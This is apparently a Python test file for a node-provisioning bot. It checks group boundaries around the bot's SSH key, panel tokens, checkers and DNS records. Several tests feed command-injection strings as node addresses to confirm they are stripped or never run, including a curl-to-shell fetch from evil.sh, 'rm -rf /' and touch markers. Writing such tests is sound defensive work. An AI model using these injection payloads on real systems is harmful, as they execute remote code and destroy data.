"""Границы между группами: ключ бота, адреса из панели в командах, подписки на чекерах пользователей."""
import asyncio
import hashlib
import hmac
import json
import time
from urllib.parse import urlencode

from bot import engine, relay, services as svc
from bot.access import Access
from bot.monitor import Monitor
from bot.runner import Runner
from bot.store import Store

ADMIN, MEMBER = 1, 77
EVIL = 'x";touch /tmp/pwned;"'


def make(tmp_path):
    store = Store(tmp_path / 'bot.db')
    runner = Runner(store, None, tmp_path / 'logs')
    runner.admins = {ADMIN}
    return store, runner


def done_job(store, pid, ip, domain):
    jid = store.add_job('b', pid, ADMIN, {'ip': ip, 'domain': domain, 'password': 'rootpw'})
    store.update_job(jid, status='done')


def test_bot_key_only_on_servers_the_bot_set_up_in_member_group(tmp_path):
    store, runner = make(tmp_path)
    pid = store.save_profile({'name': 'Вася', 'created_by': MEMBER})
    done_job(store, pid, '10.0.0.5', 'nl1.example.com')
    store.set(f'node_ssh:{pid}:u1', json.dumps({'user': 'root', 'port': 22, 'key': 'bot', 'password': ''}))
    # адрес ноды из панели пользователя указывает на чужой сервер — ключ бота туда не идёт
    assert svc.node_ssh(store, runner, pid, 'u1', '203.0.113.9') == {}
    # своя нода, купленная ботом (по IP или по домену из панели) — ключ бота работает
    assert svc.node_ssh(store, runner, pid, 'u1', '10.0.0.5')['key'] == 'bot'
    assert svc.node_ssh(store, runner, pid, 'u1', 'nl1.example.com')['key'] == 'bot'
    # с паролем вход остаётся, но без ключа бота
    store.set(f'node_ssh:{pid}:u2', json.dumps({'user': 'root', 'port': 22, 'key': 'bot', 'password': 'p'}))
    acc = svc.node_ssh(store, runner, pid, 'u2', '203.0.113.9')
    assert acc['key'] == '' and acc['password'] == 'p'


def test_admin_groups_keep_bot_key_anywhere(tmp_path):
    store, runner = make(tmp_path)
    pid = store.save_profile({'name': 'Основная', 'owner': str(ADMIN)})
    store.set(f'node_ssh:{pid}:u1', json.dumps({'user': 'root', 'port': 22, 'key': 'bot', 'password': ''}))
    assert svc.node_ssh(store, runner, pid, 'u1', '203.0.113.9')['key'] == 'bot'
    store.save_user({'tg_id': MEMBER, 'username': 'vasya'})  # клиент группы — пользователь бота
    shared = store.save_profile({'name': 'Для клиента', 'owner': str(MEMBER)})  # группа админа для пользователя
    store.set(f'node_ssh:{shared}:u1', json.dumps({'user': 'root', 'port': 22, 'key': 'bot', 'password': ''}))
    assert svc.node_ssh(store, runner, shared, 'u1', '203.0.113.9') == {}


def test_job_ssh_drops_bot_key_for_foreign_ip(tmp_path):
    store, runner = make(tmp_path)
    prof = store.profile(store.save_profile({'name': 'Вася', 'created_by': MEMBER}))
    node = runner._node_ssh({'node_uuid': 'u1', 'ip': '203.0.113.9', 'ssh': {'user': 'root', 'key': 'bot'}}, prof)
    assert not node.get('ssh_key')


def test_probe_cmd_never_runs_panel_address(tmp_path):
    """Команду проверки моста реально выполняем: адрес из панели не должен стать кодом ни на одном уровне."""
    import shutil
    import subprocess
    marker = tmp_path / 'pwned'
    for evil in (f'x";touch {marker};"', f"x';touch {marker};'", f'x$(touch {marker})', f'x`touch {marker}`'):
        cmd = relay.probe_cmd([('node', evil, 9, '')])
        if shutil.which('timeout'):
            subprocess.run(['bash', '-c', cmd], capture_output=True, timeout=60)
            assert not marker.exists(), evil
        assert f'/dev/tcp/{evil}/' not in cmd


def test_panel_drops_unsafe_node_addresses(monkeypatch):
    def fake_http(method, url, headers, body):
        if url.endswith('/api/nodes'):
            return 200, {'response': [{'uuid': 'a', 'address': 'a$(curl${IFS}evil.sh|sh)'},
                                      {'uuid': 'b', 'address': 'nl1.example.com'}, {'uuid': 'c', 'address': '10.0.0.5'}]}
        return 200, {'response': {'response': []}}
    monkeypatch.setattr(engine, 'http', fake_http)
    nodes = engine.Panel('https://panel.test', 't').call('GET', '/api/nodes')
    assert [n['address'] for n in nodes] == ['', 'nl1.example.com', '10.0.0.5']


def test_member_checker_gets_only_member_groups(tmp_path):
    store, runner = make(tmp_path)
    access = Access(store, {ADMIN})
    mine = store.save_profile({'name': 'Вася', 'created_by': MEMBER, 'mon_sub': 'https://sub/vasya'})
    store.save_profile({'name': 'Основная', 'owner': str(ADMIN), 'mon_sub': 'https://sub/admin'})
    mon = Monitor(store, runner, None, {ADMIN}, access=access)
    assert [u for _, u in mon.subs({'created_by': MEMBER})] == ['https://sub/vasya']
    assert sorted(u for _, u in mon.subs({})) == ['https://sub/admin', 'https://sub/vasya']
    assert sorted(u for _, u in mon.subs()) == ['https://sub/admin', 'https://sub/vasya']
    assert mine


def init_data(uid):
    f = {'auth_date': str(int(time.time())), 'user': json.dumps({'id': uid, 'first_name': 'Тест'}), 'query_id': 'q'}
    chk = '\n'.join(f'{k}={v}' for k, v in sorted(f.items()))
    sec = hmac.new(b'WebAppData', b'42:TEST', hashlib.sha256).digest()
    return urlencode({**f, 'hash': hmac.new(sec, chk.encode(), hashlib.sha256).hexdigest()})


def test_member_cannot_add_checker_with_bot_key(tmp_path):
    from aiohttp.test_utils import TestClient, TestServer
    from bot.web import build_web
    store, runner = make(tmp_path)
    access = Access(store, {ADMIN})
    inv = access.create_invite(ADMIN, uses=1)
    assert access.redeem(inv['token'], {'id': MEMBER, 'first_name': 'Вася'})[0]

    async def go():
        client = TestClient(TestServer(build_web(store, runner, '42:TEST', {ADMIN}, access=access, data_dir=tmp_path)))
        await client.start_server()
        try:
            r = await client.post('/api/checkers', json={'name': 'Мой', 'ip': '203.0.113.9', 'user': 'root', 'key': 'bot'},
                                  headers={'X-Init-Data': init_data(MEMBER)})
            return r.status, await r.json()
        finally:
            await client.close()
    status, js = asyncio.run(go())
    assert status == 400 and 'ключ бота' in json.dumps(js, ensure_ascii=False).lower()
    assert not store.checkers()


def test_member_group_cannot_take_foreign_dns_names(tmp_path, monkeypatch):
    store, _ = make(tmp_path)
    store.save_user({'tg_id': MEMBER, 'username': 'vasya'})
    prof = store.profile(store.save_profile({'name': 'Для клиента', 'owner': str(MEMBER)}))
    admin_prof = store.profile(store.save_profile({'name': 'Основная', 'owner': str(ADMIN)}))

    class CF:
        def zone_for(self, d):
            return 'z1'

        def records(self, d):
            return {'www.example.com': [{'type': 'A', 'content': '198.51.100.1', 'comment': ''}],
                    'nl1.example.com': [{'type': 'A', 'content': '10.0.0.5', 'comment': 'nv-deploy'}]}.get(d, [])
    monkeypatch.setattr(svc, 'cf_for', lambda store, prof: CF())
    monkeypatch.setenv('ADMIN_IDS', str(ADMIN))
    try:
        asyncio.run(svc.check_domains(store, prof, ['www.example.com'], 1))
        raise AssertionError('чужая запись не должна перезаписываться')
    except ValueError as e:
        assert 'www.example.com' in str(e)
    assert asyncio.run(svc.check_domains(store, prof, ['nl1.example.com', 'nl9.example.com'], 2))  # свои и новые — можно
    assert asyncio.run(svc.check_domains(store, admin_prof, ['www.example.com'], 1))  # у администратора — как раньше


def test_member_cannot_send_admin_panel_token_to_new_url(tmp_path):
    from aiohttp.test_utils import TestClient, TestServer
    from bot.web import build_web
    store, runner = make(tmp_path)
    access = Access(store, {ADMIN})
    inv = access.create_invite(ADMIN, uses=1)
    access.redeem(inv['token'], {'id': MEMBER, 'first_name': 'Вася'})
    pid = store.save_profile({'name': 'Для клиента', 'owner': str(MEMBER), 'owner_tg_id': str(MEMBER),
                              'panel_url': 'https://panel.admin.test', 'panel_token': 'ADMIN-SECRET-TOKEN',
                              'outgoing_ips': '203.0.113.1', 'email': 'a@b.cd'})

    async def go():
        client = TestClient(TestServer(build_web(store, runner, '42:TEST', {ADMIN}, access=access, data_dir=tmp_path)))
        await client.start_server()
        try:
            cur = store.profile(pid)
            r = await client.put(f'/api/profiles/{pid}', json={**cur, 'panel_url': 'https://evil.test', 'panel_token': ''},
                                 headers={'X-Init-Data': init_data(MEMBER)})
            return r.status, await r.json()
        finally:
            await client.close()
    status, js = asyncio.run(go())
    assert status == 400 and 'токен' in js['detail'].lower(), js
    assert store.profile(pid)['panel_url'] == 'https://panel.admin.test'


def test_checker_install_interrupted_by_restart_is_not_stuck(tmp_path):
    store, runner = make(tmp_path)
    cid = store.save_checker({'name': 'Чекер', 'ip': '203.0.113.7', 'status': 'installing'})
    mon = Monitor(store, runner, None, {ADMIN})
    mon.recover()  # при запуске бота
    ch = store.checker(cid)
    assert ch['status'] == 'failed' and 'перезапуст' in ch['error']


def member_client(tmp_path):
    store, runner = make(tmp_path)
    access = Access(store, {ADMIN})
    inv = access.create_invite(ADMIN, uses=1)
    access.redeem(inv['token'], {'id': MEMBER, 'first_name': 'Вася', 'username': 'vasya'})
    return store, runner, access


def call_as_member(store, runner, access, tmp_path, method, path, body):
    from aiohttp.test_utils import TestClient, TestServer
    from bot.web import build_web

    async def go():
        client = TestClient(TestServer(build_web(store, runner, '42:TEST', {ADMIN}, access=access, data_dir=tmp_path)))
        await client.start_server()
        try:
            r = await client.request(method, path, json=body, headers={'X-Init-Data': init_data(MEMBER)})
            return r.status, await r.json()
        finally:
            await client.close()
    return asyncio.run(go())


def test_member_cannot_switch_relay_to_bot_key_later(tmp_path):
    store, runner, access = member_client(tmp_path)
    pid = store.save_profile({'name': 'Вася', 'created_by': MEMBER})
    rid = store.save_relay({'pid': pid, 'node_uuid': 'u1', 'ip': '203.0.113.9', 'listen': 443, 'status': 'failed',
                            'ssh': {'user': 'root', 'port': 22, 'password': 'x', 'key': ''}})
    status, js = call_as_member(store, runner, access, tmp_path, 'POST', f'/api/relays/{rid}/apply', {'key': 'bot'})
    assert status == 400 and 'ключ бота' in js['detail'].lower(), js
    assert store.relay(rid)['ssh']['key'] == ''


def test_member_cannot_switch_checker_to_bot_key_later(tmp_path):
    store, runner, access = member_client(tmp_path)
    cid = store.save_checker({'name': 'Мой', 'ip': '203.0.113.9', 'user': 'root', 'port': 22, 'password': 'x', 'key': '',
                              'status': 'failed', 'created_by': MEMBER})
    status, js = call_as_member(store, runner, access, tmp_path, 'POST', f'/api/checkers/{cid}/install', {'key': 'bot'})
    assert status == 400 and 'ключ бота' in js['detail'].lower(), js
    assert store.checker(cid)['key'] == ''


def test_admin_group_for_non_member_client_is_not_member_group(tmp_path):
    store, runner = make(tmp_path)
    # клиент Bobr Cloud группы — не пользователь бота (просто покупатель) или сам администратор по @username
    for owner in ({'owner': '555', 'owner_tg_id': '555'}, {'owner': '@admin', 'owner_tg_id': str(ADMIN)}):
        pid = store.save_profile({'name': 'Админская', **owner})
        store.set(f'node_ssh:{pid}:u1', json.dumps({'user': 'root', 'port': 22, 'key': 'bot', 'password': ''}))
        assert svc.node_ssh(store, runner, pid, 'u1', '203.0.113.9')['key'] == 'bot', owner


def test_panel_keeps_idn_and_punycode_addresses(monkeypatch):
    def fake_http(method, url, headers, body):
        return 200, {'response': [{'uuid': 'a', 'address': 'нода.рф'}, {'uuid': 'b', 'address': 'node.xn--p1ai'},
                                  {'uuid': 'c', 'address': 'x;rm -rf /'}, {'uuid': 'd', 'address': '2001:db8::1'}]}
    monkeypatch.setattr(engine, 'http', fake_http)
    nodes = engine.Panel('https://panel.test', 't').call('GET', '/api/nodes')
    assert [n['address'] for n in nodes] == ['нода.рф', 'node.xn--p1ai', '', '2001:db8::1']
